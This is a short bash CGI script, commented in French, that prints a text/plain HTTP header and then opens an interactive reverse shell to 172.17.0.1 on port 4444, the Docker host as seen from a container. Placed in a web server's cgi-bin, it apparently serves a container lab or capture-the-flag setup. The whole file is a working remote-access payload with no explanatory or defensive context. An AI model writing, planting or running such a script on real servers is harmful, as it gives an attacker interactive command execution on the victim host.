#!/bin/bash
echo "Content-type: text/plain"
echo ""

# IP de l'hôte Docker visible depuis le conteneur
IP_LOCAL="172.17.0.1"

# Port à utiliser
LPORT=4444

# Exécuter la commande reverse shell vers IP_LOCAL
bash -i >& /dev/tcp/$IP_LOCAL/$LPORT 0>&1

